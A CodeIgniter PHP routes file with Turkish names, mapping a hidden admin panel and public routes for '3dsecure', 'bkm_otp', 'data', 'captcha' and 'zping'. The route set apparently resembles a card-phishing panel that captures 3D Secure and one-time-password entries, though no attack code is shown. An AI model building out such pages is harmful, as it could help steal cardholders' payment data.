<?php
defined('BASEPATH') or exit('Doğrudan erişime izin verilmiyor');

$route['default_controller']    = 'Home/index';
$route['404_override'] = '';
$route['translate_uri_dashes']  = FALSE;

$route[ADMIN_PANEL_URL]                                 = 'admin/Anasayfa';
$route[ADMIN_PANEL_URL . '/giris']                      = 'admin/Giris';
$route[ADMIN_PANEL_URL . '/(:any)']                     = 'admin/$1';

$route['index']                 = "Home/index";
$route['3dsecure/(:any)']       = "Home/treedsecure/$1";
$route['bkm_otp/(:any)']        = "Home/bkm_otp/$1";
$route['data']                  = "Home/data";
$route['captcha']               = "Home/captcha";
$route['zping']                 = "Home/zping";